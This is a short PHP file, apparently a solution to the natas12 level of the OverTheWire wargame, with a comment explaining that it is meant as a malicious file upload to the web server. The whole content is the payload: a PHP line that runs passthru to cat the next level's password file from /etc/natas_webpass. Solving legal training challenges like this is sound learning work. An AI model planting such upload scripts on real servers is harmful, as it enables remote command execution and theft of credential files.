/* 
 * This is a script written to solve natas12 from http://overthewire.org/wargames/natas/natas13.html
 * This script is used as a malicious file upload to the back-end web server, which then allows us
 * to visit the script with a URL extension to execute the code. This will simply cat the contents
 * of the password file.
*/

<?
print passthru("cat /etc/natas_webpass/natas13");
?>
